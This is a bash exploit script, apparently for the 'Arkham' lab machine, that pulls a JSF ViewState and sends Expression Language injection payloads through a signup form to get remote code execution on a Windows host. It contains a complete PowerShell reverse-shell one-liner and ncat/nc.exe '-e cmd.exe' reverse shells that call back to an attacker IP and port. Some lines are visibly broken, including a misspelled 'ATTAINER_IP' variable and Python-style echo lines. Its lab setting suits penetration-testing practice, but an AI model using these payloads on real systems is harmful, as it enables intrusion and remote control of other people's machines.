#!/bin/bash

# ============================================================================
# SIMPLE WINDOWS RCE FOR ARKHAM
# ============================================================================

TARGET="http://10.129.228.116:8080/userSubscribe.faces"
ATTACKER_IP="10.10.16.187"
ATTACKER_PORT="4444"

echo "[*] Fetching ViewState..."
VIEWSTATE=$(curl -s "$TARGET" | grep -oP 'value="\K[a-zA-Z0-9+/=]+(?=")' | head -1)

if [ -z "$VIEWSTATE" ]; then
    echo "[-] Could not extract ViewState!"
    exit 1
fi

echo "[+] ViewState: ${VIEWSTATE:0:50}..."
echo ""

# ============================================================================
# METHOD 1: PowerShell Reverse Shell (BEST)
# ============================================================================
echo "[METHOD 1] Sending PowerShell reverse shell..."

# PowerShell one-liner for reverse shell
PS_COMMAND='$$client = New-Object System.Net.Sockets.TCPClient(\"'$ATTACKER_IP'\",'$ATTACKER_PORT');$$stream = $$client.GetStream();[byte[]]$$buffer = 0..65535|%{0};while(($$i = $$stream.Read($$buffer, 0, $$buffer.Length)) -ne 0){$$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($$buffer,0, $$i);$$sendback = (iex $$data 2>&1 | Out-String );$$sendback2 = $$sendback + \"PS \" + (pwd).Path + \"> \";$$sendbyte = ([text.encoding]::ASCII).GetBytes($$sendback2);$$stream.Write($$sendbyte,0,$$sendbyte.Length);$$stream.Flush()};$$client.Close()'

# EL Injection payload
EL_PAYLOAD="\${Runtime.getRuntime().exec(new String[]{\"powershell.exe\",\"-NoP\",\"-NonI\",\"-W\",\"Hidden\",\"-Exec\",\"Bypass\",\"-Command\",\"$PS_COMMAND\"})}"

curl -s -X POST "$TARGET" \
  -d "j_id_jsp_1623871077_1:email=$EL_PAYLOAD" \
  -d "j_id_jsp_1623871077_1:submit=SIGN UP" \
  -d "j_id_jsp_1623871077_1_SUBMIT=1" \
  -d "javax.faces.ViewState=$VIEWSTATE" \
  > /dev/null

echo "[+] PowerShell payload sent!"
echo ""

# ============================================================================
# METHOD 2: CMD.exe reverse shell with ncat
# ============================================================================
echo "[METHOD 2] Sending CMD.exe + ncat reverse shell..."

EL_PAYLOAD2="\${Runtime.getRuntime().exec(new String[]{\"cmd.exe\",\"/c\",\"ncat $ATTAINER_IP $ATTACKER_PORT -e cmd.exe\"})}"

curl -s -X POST "$TARGET" \
  -d "j_id_jsp_1623871077_1:email=$EL_PAYLOAD2" \
  -d "j_id_jsp_1623871077_1:submit=SIGN UP" \
  -d "j_id_jsp_1623871077_1_SUBMIT=1" \
  -d "javax.faces.ViewState=$VIEWSTATE" \
  > /dev/null

echo "[+] CMD.exe payload sent!"
echo ""

# ============================================================================
# METHOD 3: NC.exe reverse shell
# ============================================================================
echo "[METHOD 3] Sending nc.exe reverse shell..."

EL_PAYLOAD3="\${Runtime.getRuntime().exec(new String[]{\"nc.exe\",\"$ATTACKER_IP\",\"$ATTACKER_PORT\",\"-e\",\"cmd.exe\"})}"

curl -s -X POST "$TARGET" \
  -d "j_id_jsp_1623871077_1:email=$EL_PAYLOAD3" \
  -d "j_id_jsp_1623871077_1:submit=SIGN UP" \
  -d "j_id_jsp_1623871077_1_SUBMIT=1" \
  -d "javax.faces.ViewState=$VIEWSTATE" \
  > /dev/null

echo "[+] nc.exe payload sent!"
echo ""

# ============================================================================
# METHOD 4: Test if commands execute at all
# ============================================================================
echo "[METHOD 4] Testing command execution..."

EL_PAYLOAD4="\${Runtime.getRuntime().exec(new String[]{\"cmd.exe\",\"/c\",\"echo pwned > C:\\\\temp\\\\pwned.txt\"})}"

curl -s -X POST "$TARGET" \
  -d "j_id_jsp_1623871077_1:email=$EL_PAYLOAD4" \
  -d "j_id_jsp_1623871077_1:submit=SIGN UP" \
  -d "j_id_jsp_1623871077_1_SUBMIT=1" \
  -d "javax.faces.ViewState=$VIEWSTATE" \
  > /dev/null

echo "[+] Test payload sent!"
echo ""

echo "=" * 70
echo "[+] All Windows RCE payloads sent!"
echo "[*] Listening for shell on port $ATTACKER_PORT"
echo ""
echo "Expected output in netcat:"
echo "    listening on [any] $ATTACKER_PORT ..."
echo "    Connection from 10.129.228.116 XXXXX received!"
echo "    C:\\\\>"
echo "=" * 70
